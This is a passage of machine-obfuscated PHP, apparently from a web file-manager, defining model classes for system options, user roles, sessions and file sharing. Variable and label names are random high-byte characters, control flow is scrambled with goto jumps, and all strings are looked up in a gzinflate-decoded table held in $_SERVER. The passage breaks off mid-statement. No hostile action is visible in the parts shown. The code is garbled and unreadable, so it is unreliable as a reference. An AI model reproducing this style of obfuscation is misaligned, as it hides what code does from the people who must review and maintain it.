Downloader::start($c£Ñ’”È²ƒ, $e¼—œÁ ¥); return $e¼—œÁ ¥; } } goto eŸË¥¯÷ÈĞ; F›Ü µİ£: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\164\x65\155\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\162\x6f\x6c\x65", "\x72\x6f\x6c\x65\107\x72\x6f\x75\x70", "\x72\x65\x67\x69\163\x74", "\145\155\x61\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($f‰«Ÿ¦ò¡) { return "\123\171\163\164\x65\x6d\x4f\160\164\151\x6f\x6e\x5f{$f‰«Ÿ¦ò¡}"; } protected function optionDefault($bÈ‚Àµ‹£‰ = '') { $a¶¢Ê‘’Šé =& $_SERVER[úÉ·öƒÑì©]; if ($bÈ‚Àµ‹£‰ == $a¶¢Ê‘’Šé[33]) { return $GLOBALS[$a¶¢Ê‘’Šé[6]][$a¶¢Ê‘’Šé[387]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\x72\157\154\x65\114\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\141\165\x74\150", "\154\x61\142\145\154", "\144\x69\x73\x70\x6c\x61\171", "\163\171\x73\164\x65\x6d", "\x64\x65\x73\x63", "\151\147\x6e\x6f\162\145\x45\x78\x74", "\x69\x67\156\157\x72\145\x46\151\x6c\x65\123\151\x7a\145", "\141\x64\x6d\151\x6e\x69\163\x74\x72\x61\x74\157\162", "\163\157\x72\164"); public function listData($DÂÛôì±°‘ = false, $D–°®•‘ = "\x73\x6f\x72\164", $DÛ”Á÷³»å = false) { $B¸ĞİÚ„Ã =& $_SERVER[úÉ·öƒÑì©]; $f¨Ò£—ˆ±Œ = parent::listData($DÂÛôì±°‘, $D–°®•‘, $DÛ”Á÷³»å); if (!$DÂÛôì±°‘) { foreach ($f¨Ò£—ˆ±Œ as $f •Ö†óÒ => $FÅ²Úé£Á†) { if ($FÅ²Úé£Á†[$B¸ĞİÚ„Ã[1888]] == 1) { $f¨Ò£—ˆ±Œ[$f •Ö†óÒ][$B¸ĞİÚ„Ã[440]] = LNG($B¸ĞİÚ„Ã[2114]); } } } return $f¨Ò£—ˆ±Œ; } public function update($dé¾ÚÂ¸çĞ, $D¦ç§ğò) { goto D¢ëÜŒäƒî; D¢ëÜŒäƒî: $CŞ´®–ë˜¸ =& $_SERVER[úÉ·öƒÑì©]; $B¼°°±İ†à = parent::listData($dé¾ÚÂ¸çĞ); $b‰£ÅÛƒÚÏ = $this->findByName($D¦ç§ğò[$CŞ´®–ë˜¸[28]]); goto Cî‡ñçíç„; E¬÷Ê²ÜÍâ: return parent::update($dé¾ÚÂ¸çĞ, $D¦ç§ğò); goto E’Õ ¿Ç›; Cî‡ñçíç„: if (!$B¼°°±İ†à || $b‰£ÅÛƒÚÏ && $b‰£ÅÛƒÚÏ[$CŞ´®–ë˜¸[402]] != $B¼°°±İ†à[$CŞ´®–ë˜¸[402]]) { return !1; } if ($b‰£ÅÛƒÚÏ[$CŞ´®–ë˜¸[1888]] == 1) { $D¦ç§ğò = array($CŞ´®–ë˜¸[28] => $D¦ç§ğò[$CŞ´®–ë˜¸[28]], $CŞ´®–ë˜¸[1720] => $D¦ç§ğò[$CŞ´®–ë˜¸[1720]]); } $this->filterAuth($D¦ç§ğò[$CŞ´®–ë˜¸[415]]); goto E¬÷Ê²ÜÍâ; E’Õ ¿Ç›: } public function remove($bª¼ãÂÈºë) { $E¡ïßù¬•¡ = parent::listData($bª¼ãÂÈºë); if (!$E¡ïßù¬•¡ || $E¡ïßù¬•¡[$_SERVER[úÉ·öƒÑì©][1178]]) { return !1; } return parent::remove($bª¼ãÂÈºë); } public function add($fÑ“åßîƒÕ) { goto B‡ù›šˆæ; B‡ù›šˆæ: $e×¢Ÿä =& $_SERVER[úÉ·öƒÑì©]; $DƒÛ‹Î¤›° = $fÑ“åßîƒÕ[$e×¢Ÿä[28]]; if ($this->findByName($DƒÛ‹Î¤›°)) { return !1; } goto d¸Ø•Ôğ˜¡; d¸Ø•Ôğ˜¡: $EÀÚßñá = array($e×¢Ÿä[422] => $DƒÛ‹Î¤›°, $e×¢Ÿä[1705] => $e×¢Ÿä[33], $e×¢Ÿä[1701] => $e×¢Ÿä[1709], $e×¢Ÿä[2115] => 1, $e×¢Ÿä[1704] => 0, $e×¢Ÿä[2116] => 0, $e×¢Ÿä[1703] => $this->getSort()); $fÑ“åßîƒÕ = array_merge($EÀÚßñá, $fÑ“åßîƒÕ); $this->filterAuth($fÑ“åßîƒÕ[$e×¢Ÿä[415]]); goto eÒ„Ãé“­Ë; eÒ„Ãé“­Ë: return parent::insert($fÑ“åßîƒÕ); goto E›Àñ¯Ó‚î; E›Àñ¯Ó‚î: } private function getSort() { $dˆ‰ê·¿´‡ =& $_SERVER[úÉ·öƒÑì©]; $bÑ®×ªä„é = parent::listData(); $e‚§‹¼Ã‹” = array_to_keyvalue($bÑ®×ªä„é, $dˆ‰ê·¿´‡[33], $dˆ‰ê·¿´‡[1722]); return empty($e‚§‹¼Ã‹”) ? 0 : max($e‚§‹¼Ã‹”) + 1; } private function filterAuth(&$F±”ÃÄò¾ˆ) { $céÖôÒ˜‡ =& $_SERVER[úÉ·öƒÑì©]; $Bç§Œåî™ = array(); $EóçòÎä›ó = array_filter(explode($céÖôÒ˜‡[47], $F±”ÃÄò¾ˆ)); foreach ($EóçòÎä›ó as $F±”ÃÄò¾ˆ) { $dÖ¬àœÖ­ä = explode($céÖôÒ˜‡[95], $F±”ÃÄò¾ˆ); if ($dÖ¬àœÖ­ä[0] == $céÖôÒ˜‡[2117] && $dÖ¬àœÖ­ä[1] != $céÖôÒ˜‡[1098]) { $F›ÙÃÛ¤Ìó = $dÖ¬àœÖ­ä[0] . $céÖôÒ˜‡[95] . $dÖ¬àœÖ­ä[1] . $céÖôÒ˜‡[2118]; if (!in_array($F›ÙÃÛ¤Ìó, $EóçòÎä›ó)) { $Bç§Œåî™[] = $F›ÙÃÛ¤Ìó; } } $Bç§Œåî™[] = $F±”ÃÄò¾ˆ; } $F±”ÃÄò¾ˆ = implode($céÖôÒ˜‡[47], $Bç§Œåî™); } public function sort($F’ƒˆ¤†ç†, $EºÏ²‹ñğ†) { return parent::update($F’ƒˆ¤†ç†, $EºÏ²‹ñğ†); } } goto D‰ë·İ¤é; b£ä‰¯ã—: $Cåğ³‚œì‡ = $_SERVER[úÉ·öƒÑì©][583]; $_SERVER[›É] = explode($_SERVER[úÉ·öƒÑì©][584], gzinflate(substr($_SERVER[úÉ·öƒÑì©][585], 10, -8))); $aˆ“éƒ¹á = $_SERVER[úÉ·öƒÑì©][586]; goto E†•¶İ¢îÙ; b›ˆĞªÑ: class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\x5f\163\x65\x73\x73\x69\x6f\x6e"; public function get($bÂÅÎœ’“Í) { $F¢Ü·î†ñŠ =& $_SERVER[úÉ·öƒÑì©]; $BÙ¤–·Î¯ = $this->where(array($F¢Ü·î†ñŠ[1823] => $bÂÅÎœ’“Í))->find(); if (!is_array($BÙ¤–·Î¯)) { return !1; } return $BÙ¤–·Î¯[$F¢Ü·î†ñŠ[731]]; } public function set($FÅ™óæàÃ×, $dö£çÃ´›¾, $FÎœ¾ŠÎ°Ä = 3600) { $cÀÔ¶©éÖ =& $_SERVER[úÉ·öƒÑì©]; $d“”¥Œ—Ã = array($cÀÔ¶©éÖ[1823] => $FÅ™óæàÃ×, $cÀÔ¶©éÖ[1732] => $dö£çÃ´›¾, $cÀÔ¶©éÖ[1824] => $FÎœ¾ŠÎ°Ä + time()); if (Session::get($cÀÔ¶©éÖ[1825])) { $d“”¥Œ—Ã[$cÀÔ¶©éÖ[1535]] = Session::get($cÀÔ¶©éÖ[1825]); } else { $d“”¥Œ—Ã[$cÀÔ¶©éÖ[1535]] = 0; } if ($this->get($FÅ™óæàÃ×)) { return $this->where(array($cÀÔ¶©éÖ[1823] => $FÅ™óæàÃ×))->save($d“”¥Œ—Ã); } else { return $this->add($d“”¥Œ—Ã, array(), !0); } } public function remove($fÃäŒÉã˜) { return $this->where(array($_SERVER[úÉ·öƒÑì©][1823] => $fÃäŒÉã˜))->delete(); } public function clearTimeout() { return $this->where($_SERVER[úÉ·öƒÑì©][1826] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\x66\171\x54\x69\155\x65", "\164\151\155\145", "\151\x6e\163\x65\162\x74\x2c\x75\160\x64\141\x74\x65", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x63\162\x65\x61\x74\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\164", "\146\x75\156\x63\164\151\157\156"), array("\157\160\x74\151\x6f\156\163", '', "\x69\x6e\163\x65\x72\164\54\x75\160\x64\141\164\145\54\163\x65\x6c\x65\x63\164", "\x6a\x73\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($e‹½í¿æñÜ) { $fœˆâøö§õ =& $_SERVER[úÉ·öƒÑì©]; $AÂÒÒ±Ù¬õ = isset($e‹½í¿æñÜ[0]) ? $e‹½í¿æñÜ[0] : !1; return array($fœˆâøö§õ[1827] => array(USER_ID, $fœˆâøö§õ[1828]), $fœˆâøö§õ[1771] => array($AÂÒÒ±Ù¬õ, $fœˆâøö§õ[1829])); } protected function listSimple() { $f´˜´Ñ ƒ˜ = array($_SERVER[úÉ·öƒÑì©][1535] => USER_ID); $CİôÖ¦‹â‰ = $this->field($this->fieldList)->where($f´˜´Ñ ƒ˜)->select(); return $CİôÖ¦‹â‰ ? $CİôÖ¦‹â‰ : array(); } protected function getInfo($D¿“±ÑõÅÇ, $EØ¨›°›†ß = false) { $AÓ¨°¡› =& $_SERVER[úÉ·öƒÑì©]; if ($EØ¨›°›†ß) { return $this->_getShareInfo(array($AÓ¨°¡›[477] => $D¿“±ÑõÅÇ)); } $bÛ¼è¡¹é˜ = $this->cacheFunctionGet($AÓ¨°¡›[1778], $D¿“±ÑõÅÇ); return $bÛ¼è¡¹é˜; } public function getInfoByHash($d‚óÇ«¥Ô²) { return $this->_getShareInfo(array($_SERVER[úÉ·öƒÑì©][479] => $d‚óÇ«¥Ô²)); } public function getInfoByPath($C§‡½Ì”) { $AŒ„õÓÓ¾ =& $_SERVER[úÉ·öƒÑì©]; $B„ÆË¡ñ‚ = array($AŒ„õÓÓ¾[1535] => USER_ID, $AŒ„õÓÓ¾[404] => $C§‡½Ì”); return $this->_getShareInfo($B„ÆË¡ñ‚); } public function getInfoBySourcePath($EÍÀ¼¿Úö„) { $BÒ¿Å°š‰§ =& $_SERVER[úÉ·öƒÑì©]; $FŠ ĞñÂ†Ù = array($BÒ¿Å°š‰§[1535] => USER_ID, $BÒ¿Å°š‰§[1079] => $EÍÀ¼¿Úö„); return $this->_getShareInfo($FŠ ĞñÂ†Ù); } private function _getShareInfo($F¨ßÕèÂ›º) { goto E·¾Ò‡Å„ö; b…¾„™ß”ë: if ($Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[404]] == $b‚ØÄå‹Û¼[191]) { $Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[85]] = IO::info($Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[1079]]); } else { $Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[85]] = Model($b‚ØÄå‹Û¼[1213])->pathInfo($Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[404]]); } $Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[1831]] = $Bë‘×ƒİìò; return $Eö¼Œ²Ö”‚; goto f’¤ƒÌÇã³; E·¾Ò‡Å„ö: $b‚ØÄå‹Û¼ =& $_SERVER[úÉ·öƒÑì©]; $Eö¼Œ²Ö”‚ = $this->where($F¨ßÕèÂ›º)->find(); if (!$Eö¼Œ²Ö”‚) { return !1; } goto BÄÉùŸ§±¶; BÄÉùŸ§±¶: $F¨ßÕèÂ›º = array($b‚ØÄå‹Û¼[477] => $Eö¼Œ²Ö”‚[$b‚ØÄå‹Û¼[477]]); $f‚­ïƒ‡îÎ = $b‚ØÄå‹Û¼[1830]; $Bë‘×ƒİìò = Model($b‚ØÄå‹Û¼[573])->order($b‚ØÄå‹Û¼[402])->field($f‚­ïƒ‡îÎ)->where($F¨ßÕèÂ›º)->select(); goto b…¾„™ß”ë; f’¤ƒÌÇã³: } protected function getInfoAuth($AëÙÎòß¼ƒ) { $Bãİ‘©ùÊ =& $_SERVER[úÉ·öƒÑì©]; $BµøÁæÊŒ = $this->getInfo($AëÙÎòß¼ƒ); $BµøÁæÊŒ[$Bãİ‘©ùÊ[415]] = Model($Bãİ‘©ùÊ[491])->authMake($BµøÁæÊŒ[$Bãİ‘©ùÊ[1831]]); return $BµøÁæÊŒ; } protected function listData($c³Æõ« = null, $BñÈŞ¿ ĞÌ = 300) { $AÑ®Ö±’Áæ =& $_SERVER[úÉ·öƒÑì©]; $Cæ…İ‡í¨ã = array(array($AÑ®Ö±’Áæ[482] => array($AÑ®Ö±’Áæ[977], 0), $AÑ®Ö±’Áæ[484] => array($AÑ®Ö±’Áæ[977], 0), $AÑ®Ö±’Áæ[1832] => $AÑ®Ö±’Áæ[1786])); if ($c³Æõ« == $AÑ®Ö±’Áæ[1833]) { $Cæ…İ‡í¨ã = array($AÑ®Ö±’Áæ[482] => 1); } else { if ($c³Æõ« == $AÑ®Ö±’Áæ[1064]) { $Cæ…İ‡í¨ã = array($AÑ®Ö±’Áæ[484] => 1); } } $Cæ…İ‡í¨ã[$AÑ®Ö±’Áæ[1535]] = USER_ID; $Cƒ÷…„í ò = $this->where($Cæ…İ‡í¨ã)->selectPage($BñÈŞ¿ ĞÌ); return $Cƒ÷…„í ò; } protected function listToMe($fÊª§ŸöŒÚ = 300) { goto fÍçğ¹±–Š; dâ¥·Ê…â: $C®§õŸÁİÓ = array($fÜŞ÷ô–Õ[1836] => $F˜£øÁù ¥, $fÜŞ÷ô–Õ[1837] => $dØ……¹º›ë[$fÜŞ÷ô–Õ[373]]); return $C®§õŸÁİÓ; goto b†Ä™—Òíå; B¾¢Õß™Ñ³: $F˜£øÁù ¥ = $this->field($cóã‡¹ğ‘ß)->where($f¦”Æá¢ ß)->select(); foreach ($F˜£øÁù ¥ as $A…¼­Ö°× => &$fÀ“İÁŞª) { $fÀ“İÁŞª[$fÜŞ÷ô–Õ[1831]] = $f‚—áË‡õ[$fÀ“İÁŞª[$fÜŞ÷ô–Õ[477]]]; } unset($fÀ“İÁŞª); goto dâ¥·Ê…â; BùÍòøî¶‹: if (!$f‚—áË‡õ) { return $dØ……¹º›ë; } $cóã‡¹ğ‘ß = $fÜŞ÷ô–Õ[1835]; $f¦”Æá¢ ß = array($fÜŞ÷ô–Õ[477] => array($fÜŞ÷ô–Õ[420], array_keys($f‚—áË‡õ))); goto B¾¢Õß™Ñ³; fÍçğ¹±–Š: $fÜŞ÷ô–Õ =& $_SERVER[úÉ·öƒÑì©]; $a°¡Ïó³ˆ = Model($fÜŞ÷ô–Õ[1834])->userGroupParents(USER_ID); $f¦”Æá¢ ß = array($fÜŞ÷ô–Õ[558] => SourceModel::TYPE_USER, $fÜŞ÷ô–Õ[493] => USER_ID); goto fˆ‚ø¨Àêà; fˆ‚ø¨Àêà: if ($a°¡Ïó³ˆ) { $f¦”Æá¢ ß = array(array($fÜŞ÷ô–Õ[558] => SourceModel::TYPE_USER, $fÜŞ÷ô–Õ[493] => USER_ID), array($fÜŞ÷ô–Õ[558] => SourceModel::TYPE_GROUP, $fÜŞ÷ô–Õ[493] => array($fÜŞ÷ô–Õ[7], $a°¡Ïó³ˆ)), $fÜŞ÷ô–Õ[1832] => $fÜŞ÷ô–Õ[1786]); } $dØ……¹º›ë = Model($fÜŞ÷ô–Õ[573])->where($f¦”Æá¢ ß)->selectPage($fÊª§ŸöŒÚ); $f‚—áË‡õ = array_to_keyvalue_group($dØ……¹º›ë[$fÜŞ÷ô–Õ[376]], $fÜŞ÷ô–Õ[477]); goto BùÍòøî¶‹; b†Ä™—Òíå: } protected function shareAdd($c¬ßÃê—‹ç, $d·ÌãÑÍª¬) { $F ˆëÈùœ³ =& $_SERVER[úÉ·öƒÑì©]; $eÌ¥ĞÃ½ = $this->_addShareData($c¬ßÃê—‹ç, $d·ÌãÑÍª¬); if (!empty($d·ÌãÑÍª¬[$F ˆëÈùœ³[1838]])) { $this->_shareAuthSet($eÌ¥ĞÃ½, $d·ÌãÑÍª¬[$F ˆëÈùœ³[1838]]); } $this->shareEventAdd($c¬ßÃê—‹ç, $d·ÌãÑÍª¬, $F ˆëÈùœ³[1067]); return $eÌ¥ĞÃ½; } private function shareEventAdd($DÓíõèŞÆà, $A†³Á‹†œ, $FˆíšáÑ¶Î = "\x61\144\x64") { goto f»ÕĞÆË¶¦; f»ÕĞÆË¶¦: $A‰õÍµÄöƒ =& $_SERVER[úÉ·öƒÑì©]; if (!$DÓíõèŞÆà || $DÓíõèŞÆà == $A‰õÍµÄöƒ[191]) { return; } if ($FˆíšáÑ¶Î == $A‰õÍµÄöƒ[1067]) { if ($A†³Á‹†œ[$A‰õÍµÄöƒ[482]] == $A‰õÍµÄöƒ[87]) { Model($A‰õÍµÄöƒ[542])->eventShare($DÓíõèŞÆà, $A‰õÍµÄöƒ[1839]); } if ($A†³Á‹†œ[$A‰õÍµÄöƒ[484]] == $A‰õÍµÄöƒ[87]) { Model($A‰õÍµÄöƒ[542])->eventShare($DÓíõèŞÆà, $A‰õÍµÄöƒ[1840]); } return; } goto FˆôõªÛ½‘; BÆêÅÔ¾Í‡: Model($A‰õÍµÄöƒ[542])->eventShare($DÓíõèŞÆà, $BË„Ûá·¨ğ); return; goto B±Øë§‹ç°; e—¸Œ‘©¦Á: if ($AÀçÅ·¤¢[$A‰õÍµÄöƒ[482]] == $A‰õÍµÄöƒ[87] && $A†³Á‹†œ[$A‰õÍµÄöƒ[482]] == $A‰õÍµÄöƒ[191]) { $BË„Ûá·¨ğ = $A‰õÍµÄöƒ[1842]; } if ($AÀçÅ·¤¢[$A‰õÍµÄöƒ[484]] == $A‰õÍµÄöƒ[191] && $A†³Á‹†œ[$A‰õÍµÄöƒ[484]] == $A‰õÍµÄöƒ[87]) { $BË„Ûá·¨ğ = $A‰õÍµÄöƒ[1840]; } if ($AÀçÅ·¤¢[$A‰õÍµÄöƒ[484]] == $A‰õÍµÄöƒ[87] && $A†³Á‹†œ[$A‰õÍµÄöƒ[484]] == $A‰õÍµÄöƒ[191]) { $BË„Ûá·¨ğ = $A‰õÍµÄöƒ[1843]; } goto BÆêÅÔ¾Í‡; FˆôõªÛ½‘: $AÀçÅ·¤¢ = $this->getInfoByPath($DÓíõèŞÆà); $BË„Ûá·¨ğ = $A‰õÍµÄöƒ[1841]; if ($AÀçÅ·¤¢[$A‰õÍµÄöƒ[482]] == $A‰õÍµÄöƒ[191] && $A†³Á‹†œ[$A‰õÍµÄöƒ[482]] == $A‰õÍµÄöƒ[87]) { $BË„Ûá·¨ğ = $A‰õÍµÄöƒ[1839]; } goto e—¸Œ‘©¦Á; B±Øë§‹ç°: } private function _addShareData($e› ¶æàáí, $C›î‚ÎæÎ = array()) { goto e£Ü¤¿°Ò¶; Aªé³”¤íÜ: $C¿ñ…êÛ°Ğ = array($a•¡ÅàÆøà[1527] => USER_ID, $a•¡ÅàÆøà[419] => $e› ¶æàáí, $a•¡ÅàÆøà[1441] => $a•¡ÅàÆøà[33], $a•¡ÅàÆøà[482] => 0, $a•¡ÅàÆøà[484] => 0, $a•¡ÅàÆøà[1079] => $a•¡ÅàÆøà[33], $a•¡ÅàÆøà[314] => $a•¡ÅàÆøà[33], $a•¡ÅàÆøà[857] => $a•¡ÅàÆøà[33], $a•¡ÅàÆøà[1845] => 0, $a•¡ÅàÆøà[1846] => 0, $a•¡ÅàÆøà[485] => 0, $a•¡ÅàÆøà[486] => $a•¡ÅàÆøà[33], $a•¡ÅàÆøà[479] => $a•¡ÅàÆøà[33]); $dêîîåİí‚ = explode($a•¡ÅàÆøà[47], $a•¡ÅàÆøà[1847]); foreach ($dêîîåİí‚ as $bù„áË”Â) { if (!isset($C›î‚ÎæÎ[$bù„áË”Â])) { continue; } $C¿ñ…êÛ°Ğ[$bù„áË”Â] = $C›î‚ÎæÎ[$bù„áË”Â]; } goto eŠƒº‹¿ˆÖ; aº•’óØ–å: if ($E×ÕÊ Ò¥÷ = $this->where($aµÜĞã‘­Ç)->find()) { return $E×ÕÊ Ò¥÷[$a•¡ÅàÆøà[477]]; } if ($e› ¶æàáí == 0) { $c¹˜¹ƒ–›ó = array($a•¡ÅàÆøà[28] => get_path_this($C›î‚ÎæÎ[$a•¡ÅàÆøà[76]])); } else { $c¹˜¹ƒ–›ó = Model($a•¡ÅàÆøà[806])->sourceInfo($e› ¶æàáí); if (!$c¹˜¹ƒ–›ó) { return !1; } } if (!$C›î‚ÎæÎ[$a•¡ÅàÆøà[1441]]) { $C›î‚ÎæÎ[$a•¡ÅàÆøà[1441]] = $c¹˜¹ƒ–›ó[$a•¡ÅàÆøà[28]]; } goto Aªé³”¤íÜ; d÷¼Çˆ´™ª: return $bøŸ·¥²¢; goto Fã·²®ôª‡; eŠƒº‹¿ˆÖ: $bøŸ·¥²¢ = $this->add($C¿ñ…êÛ°Ğ); $Cù‡‡Ÿ£“ğ = array($a•¡ÅàÆøà[479] => short_id($bøŸ·¥²¢)); $this->where(array($a•¡ÅàÆøà[476] => $bøŸ·¥²¢))->save($Cù‡‡Ÿ£“ğ); goto d÷¼Çˆ´™ª; e£Ü¤¿°Ò¶: $a•¡ÅàÆøà =& $_SERVER[úÉ·öƒÑì©]; $aµÜĞã‘­Ç = array($a•¡ÅàÆøà[419] => $e› ¶æàáí, $a•¡ÅàÆøà[1527] => USER_ID); if ($e› ¶æàáí == 0) { $aµÜĞã‘­Ç = array($a•¡ÅàÆøà[1844] => $C›î‚ÎæÎ[$a•¡ÅàÆøà[1079]], $a•¡ÅàÆøà[1527] => USER_ID); } goto aº•’óØ–å; Fã·²®ôª‡: } private function _shareAuthSet($C¿Ù²âÇ‹†, $aõ›—à¯ä) { goto Eìœáâ‡©á; C§Å¨ßã: $Aº‚Æ·Ğ¸»->where(array($b÷÷°£ƒï[477] => $C¿Ù²âÇ‹†))->delete(); $c‡±±ï˜Ê… = array(); foreach ($aõ›—à¯ä as $EÛ”ŠÎ‘) { $BÂÁëß¡¢ñ = SourceModel::TYPE_USER; if ($EÛ”ŠÎ‘[$b÷÷°£ƒï[413]] == SourceModel::TYPE_GROUP) { $BÂÁëß¡¢ñ = SourceModel::TYPE_GROUP; } $d­‰õ»ÚÄÜ = array($b÷÷°£ƒï[477] => $C¿Ù²âÇ‹†, $b÷÷°£ƒï[413] => $BÂÁëß¡¢ñ, $b÷÷°£ƒï[493] => intval($EÛ”ŠÎ‘[$b÷÷°£ƒï[493]]), $b÷÷°£ƒï[1794] => 0, $b÷÷°£ƒï[1848] => -1); if ($EÛ”ŠÎ‘[$b÷÷°£ƒï[1794]]) { $d­‰õ»ÚÄÜ[$b÷÷°£ƒï[1794]] = $EÛ”ŠÎ‘[$b÷÷°£ƒï[1794]]; } else { if ($EÛ”ŠÎ‘[$b÷÷°£ƒï[1848]]) { $d­‰õ»ÚÄÜ[$b÷÷°£ƒï[1848]] = $EÛ”ŠÎ‘[$b÷÷°£ƒï[1848]]; } } $c‡±±ï˜Ê…[] = $d­‰õ»ÚÄÜ; } goto DÚá—ˆä¤Ô; Eìœáâ‡©á: $b÷÷°£ƒï =& $_SERVER[úÉ·öƒÑì©]; if (!is_array($aõ›—à¯ä)) { return !1; } $Aº‚Æ·Ğ¸» = Model($b÷÷°£ƒï[1798]); goto C§Å¨ßã; DÚá—ˆä¤Ô: return $Aº‚Æ·Ğ¸»->addAll($c‡±±ï˜Ê…, array(), !0); goto C‘ÒÁÑ¡ë‹; C‘ÒÁÑ¡ë‹: } public function numViewAdd($D¶ÊÁòË±) { $Dæ„†í¡‡† =& $_SERVER[úÉ·öƒÑì©]; $EÁ¬Ã¶Š¶« = array($Dæ„†í¡‡†[476] => $D¶ÊÁòË±); $this->where($EÁ¬Ã¶Š¶«)->setAdd($Dæ„†í¡‡†[1845]); } public function numDownloadAdd($eÄ¡¨öô»Ü) { $Fó†ŠÀƒ¸‡ =& $_SERVER[úÉ·öƒÑì©]; $fÎ®‡§¡ˆ = array($Fó†ŠÀƒ¸‡[476] => $eÄ¡¨öô»Ü); $this->where($fÎ®‡§¡ˆ)->setAdd($Fó†ŠÀƒ¸‡[1846]); } protected function shareEdit($d¯Éãƒîó¨, $eÉ­œ¼ª) { goto eÇË¦·™å; eÙ‹˜î í: foreach ($CÎŞ«„ñ´‚ as $C˜ï¶»¤ºÚ) { if (!array_key_exists($C˜ï¶»¤ºÚ, $eÉ­œ¼ª)) { continue; } $dÄ’Ü“¡¯Š[$C˜ï¶»¤ºÚ] = $eÉ­œ¼ª[$C˜ï¶»¤ºÚ]; } $this->shareEventAdd($DÍÍ‹çÁ‘µ[$AÜë×‰ÍÂ[404]], $eÉ­œ¼ª, $AÜë×‰ÍÂ[1666]); $this->where(array($AÜë×‰ÍÂ[476] => $d¯Éãƒîó¨))->save($dÄ’Ü“¡¯Š); goto B„‰§Àƒ¾¿; eÇË¦·™å: $AÜë×‰ÍÂ =& $_SERVER[úÉ·öƒÑì©]; $DÍÍ‹çÁ‘µ = $this->getInfo($d¯Éãƒîó¨); if (!$DÍÍ‹çÁ‘µ) { return !1; } goto F¬‹”Şœ™Å; B„‰§Àƒ¾¿: if (isset($eÉ­œ¼ª[$AÜë×‰ÍÂ[1838]])) { $this->_shareAuthSet($d¯Éãƒîó¨, $eÉ­œ¼ª[$AÜë×‰ÍÂ[1838]]); } return !0; goto AÏŠ»Æ˜å; F¬‹”Şœ™Å: $this->_checkLinkShare($eÉ­œ¼ª, $DÍÍ‹çÁ‘µ); $dÄ’Ü“¡¯Š = array(); $CÎŞ«„ñ´‚ = explode($AÜë×‰ÍÂ[47], $AÜë×‰ÍÂ[1849]); goto eÙ‹˜î í; AÏŠ»Æ˜å: } private function _checkLinkShare($BêîÏ½Ş½, $D¯Ìë’¯Şç) { goto b¯³Ÿê¬«; Eê¶éæŒŠ: if ($D¯Ìë’¯Şç[$aƒî‡´Âà[85]][$aƒî‡´Âà[29]] != $aƒî‡´Âà[193]) { $F­˜Üóøµğ = $this->_folderReport($A¾õ¢ƒÃ×Ã); if (!$F­˜Üóøµğ) { return; } show_json(LNG($aƒî‡´Âà[1850]) . $aƒî‡´Âà[1851] . $F­˜Üóøµğ, !1); } $DœÅå…ğ±ƒ = Model($aƒî‡´Âà[806])->fileInfoGet($D¯Ìë’¯Şç[$aƒî‡´Âà[85]][$aƒî‡´Âà[404]]); if (!$DœÅå…ğ±ƒ) { return; } goto B „å§“¸¯; b¯³Ÿê¬«: $aƒî‡´Âà =& $_SERVER[úÉ·öƒÑì©]; if ($BêîÏ½Ş½[$aƒî‡´Âà[482]] != $aƒî‡´Âà[87]) { return; } $A¾õ¢ƒÃ×Ã = $D¯Ìë’¯Şç[$aƒî‡´Âà[85]][$aƒî‡´Âà[404]]; goto Eê¶éæŒŠ; B „å§“¸¯: $A˜Å±»ïŒ = $this->shareFileMeta($DœÅå…ğ±ƒ[$aƒî‡´Âà[456]]); if (isset($A˜Å±»ïŒ[$aƒî‡´Âà[381]]) && $A˜Å±»ïŒ[$aƒî‡´Âà[381]] == $aƒî‡´Âà[87]) { show_json(LNG($aƒî‡´Âà[1852]), !1); } goto e÷ãÚ œî÷; e÷ãÚ œî÷: } private function _folderReport($eÓ†×Á‘Åù) { goto eÈ«Ê¤Ëµ; bµÓŠ¹ Ã: $a‡ø‡‚ÑÃ = array_to_keyvalue($EÎÕ£ª“Î¬, $e…¬™î†Éİ[33], $e…¬™î†Éİ[28]); $a‡ø‡‚ÑÃ[] = $c×ÏÍİ¼İ[$e…¬™î†Éİ[28]]; return implode($e…¬™î†Éİ[8], $a‡ø‡‚ÑÃ); goto D’Ëì ìáÙ; eÙóŠ¬­ùó: if (!$Bòè‘…ò×) { return !1; } $Bòè‘…ò× = array_to_keyvalue($Bòè‘…ò×, $e…¬™î†Éİ[33], $e…¬™î†Éİ[456]); $BÎ¥ÎÈğÛ = $e…¬™î†Éİ[47] . $eÓ†×Á‘Åù . $e…¬™î†Éİ[47]; goto FîÆé¾£¼¦; eÈ«Ê¤Ëµ: $e…¬™î†Éİ =& $_SERVER[úÉ·öƒÑì©]; $f™‚Êë‹ƒá = array($e…¬™î†Éİ[456] => array($e…¬™î†Éİ[977], 0), $e…¬™î†Éİ[726] => 3); $Bòè‘…ò× = Model($e…¬™î†Éİ[1853])->where($f™‚Êë‹ƒá)->field($e…¬™î†Éİ[456])->select(); goto eÙóŠ¬­ùó; Dò¡ß´°: $dÙ÷„ÑÓèÅ = substr($c×ÏÍİ¼İ[$e…¬™î†Éİ[496]], strpos($c×ÏÍİ¼İ[$e…¬™î†Éİ[496]], $BÎ¥ÎÈğÛ)); $f™‚Êë‹ƒá = array($e…¬™î†Éİ[404] => array($e…¬™î†Éİ[7], trim($dÙ÷„ÑÓèÅ, $e…¬™î†Éİ[47]))); $EÎÕ£ª“Î¬ = Model($e…¬™î†Éİ[806])->where($f™‚Êë‹ƒá)->field($e…¬™î†Éİ[28])->select(); goto bµÓŠ¹ Ã; FîÆé¾£¼¦: $f™‚Êë‹ƒá = array($e…¬™î†Éİ[456] => array($e…¬™î†Éİ[7], $Bòè‘…ò×), 